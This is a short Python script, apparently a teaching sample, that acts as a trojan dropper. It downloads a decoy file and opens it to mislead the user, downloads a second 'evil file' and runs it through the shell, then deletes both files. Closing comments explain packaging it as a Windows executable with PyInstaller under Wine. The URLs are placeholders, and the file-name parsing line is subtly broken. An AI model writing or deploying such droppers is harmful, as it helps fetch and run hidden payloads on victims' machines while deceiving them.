#!/usr/bin/python
import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/"[-1])
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("Whatever file to camouflage")
subprocess.Popen("file name", shell=True) # in OSX do "open [file name]"

download("evil file")
subprocess.call("file name", shell=True) # on OSX do "python [file name].py"

os.remove("file name 1")
os.remove("file name 2")

# use requests version 2.5.1 for pyinstaller
# wine /root/.wine/drive_c/Python27/python.exe -m pip install requests==2.5.1
